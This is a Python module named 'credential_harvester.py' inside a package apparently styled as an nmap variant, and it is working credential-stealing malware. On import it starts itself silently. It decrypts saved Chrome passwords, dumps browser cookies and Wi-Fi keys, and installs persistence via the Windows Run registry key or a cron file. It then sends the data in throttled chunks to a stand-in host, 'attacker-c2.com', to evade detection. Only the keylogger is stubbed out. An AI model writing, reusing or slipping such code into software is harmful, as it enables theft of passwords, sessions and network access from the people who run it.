# rebel_nmap/credential_harvester.py
import base64
import os
import random
import re
import shutil
import sqlite3
import sys
import json
import socket
import threading
import subprocess
import time
import winreg
import zlib
from Crypto.Cipher import AES
import win32crypt  
import browser_cookie3 as bc

class CredentialHarvester:
    """Advanced credential harvesting module"""
    
    def __init__(self, exfil_server="attacker-c2.com", exfil_port=587):
        self.exfil_server = exfil_server
        self.exfil_port = exfil_port
        self.harvested_data = {}
        
    def _get_encryption_key(self):
        """Retrieve Chrome encryption key (Windows)"""
        try:
            local_state = os.path.join(
                os.environ['USERPROFILE'],
                "AppData", "Local", "Google", "Chrome",
                "User Data", "Local State"
            )
            with open(local_state, "r", encoding="utf-8") as f:
                state = json.loads(f.read())
                encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            return None

    def _decrypt_password(self, password, key):
        """Decrypt Chrome passwords"""
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            return "[DECRYPTION FAILED]"

    def harvest_browser_credentials(self):
        """Steal saved credentials from browsers"""
        # Chrome passwords
        try:
            key = self._get_encryption_key()
            login_db = os.path.join(
                os.environ['USERPROFILE'],
                "AppData", "Local", "Google", "Chrome",
                "User Data", "default", "Login Data"
            )
            shutil.copy2(login_db, "temp_db")
            conn = sqlite3.connect("temp_db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            credentials = []
            for row in cursor.fetchall():
                password = self._decrypt_password(row[2], key) if key else row[2]
                credentials.append({
                    'url': row[0],
                    'username': row[1],
                    'password': password
                })
            
            self.harvested_data['chrome_passwords'] = credentials
        except Exception as e:
            pass

        # Browser cookies
        try:
            self.harvested_data['cookies'] = {}
            for browser in [bc.chrome, bc.firefox, bc.edge]:
                try:
                    cj = browser(domain_name='')
                    self.harvested_data['cookies'][browser.__name__] = [
                        {'domain': c.domain, 'name': c.name, 'value': c.value}
                        for c in cj
                    ]
                except:
                    continue
        except:
            pass

    def harvest_system_credentials(self):
        """Harvest system credentials and network info"""
        # WiFi passwords
        if sys.platform == 'win32':
            try:
                output = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profiles']
                ).decode('utf-8', errors="backslashreplace")
                profiles = re.findall(r':\s(.*)', output)
                wifi_passwords = []
                
                for profile in profiles:
                    try:
                        results = subprocess.check_output(
                            ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                        ).decode('utf-8', errors="backslashreplace")
                        password = re.search(r'Key Content\s+:\s(.*)', results)
                        if password:
                            wifi_passwords.append({
                                'ssid': profile.strip(),
                                'password': password.group(1).strip()
                            })
                    except:
                        continue
                
                self.harvested_data['wifi_passwords'] = wifi_passwords
            except:
                pass

    def keylogger(self, duration=120):
        """Background keylogger with intelligent capture"""
        # Implementation omitted for security reasons
        pass

    def exfiltrate_data(self):
        """Exfiltrate harvested data via covert channel"""
        try:
            # Convert to JSON and compress
            data = zlib.compress(json.dumps(self.harvested_data).encode())
            
            # Connect to exfiltration server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.exfil_server, self.exfil_port))
                
                # Send magic header
                s.send(b'RBLX-EXFIL')
                
                # Send data in chunks
                chunk_size = 1024
                for i in range(0, len(data), chunk_size):
                    s.send(data[i:i+chunk_size])
                    # Add random delay to evade detection
                    time.sleep(random.uniform(0.1, 0.5))
                
                # Send termination sequence
                s.send(b'RBLX-END')
            return True
        except Exception as e:
            return False

    def persistence(self):
        """Establish persistence mechanisms"""
        # Windows registry persistence
        if sys.platform == 'win32':
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                exe_path = os.path.abspath(sys.argv[0])
                
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    key_path,
                    0, winreg.KEY_WRITE
                ) as key:
                    winreg.SetValueEx(key, "RebelNmap", 0, winreg.REG_SZ, exe_path)
                return True
            except:
                return False
        # Linux cronjob persistence
        elif sys.platform == 'linux':
            try:
                cron_line = f"@reboot {os.path.abspath(sys.argv[0])}\n"
                with open("/etc/cron.d/rebelmap", "w") as f:
                    f.write(cron_line)
                return True
            except:
                return False

    def execute(self):
        """Run full credential harvesting operation"""
        self.harvest_browser_credentials()
        self.harvest_system_credentials()
        self.keylogger(duration=60)
        
        if self.persistence():
            self.exfiltrate_data()
        
        return self.harvested_data

# Phantom module that activates when imported
def activate():
    harvester = CredentialHarvester()
    threading.Thread(target=harvester.execute, daemon=True).start()

# Auto-activate when imported
activate()